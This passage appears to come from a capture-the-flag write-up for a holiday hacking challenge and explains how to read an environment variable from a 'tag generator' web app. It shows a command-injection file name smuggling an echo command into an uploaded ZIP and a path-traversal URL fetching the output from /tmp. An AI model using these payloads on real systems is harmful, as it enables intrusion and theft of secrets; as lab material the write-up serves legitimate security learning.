...
To retrieve the value of the `GREETZ` environment variable, create an [image file](./../tools/o8/myfile';echo%20$GREETZ>the_GREETZ_tag.txt;ls%20'.png) named `myfile';echo $GREETZ>the_GREETZ_tag.txt;ls '.png`, add it to a ZIP file, and upload it using the tag generator application. The application will unpack the archive, execute our command, and save the output to `/tmp/the_GREETZ_tag.txt` which we can then download using a request to `https://tag-generator.kringlecastle.com/image?id=../../../tmp/the_GREETZ_tag.txt`. :boom:
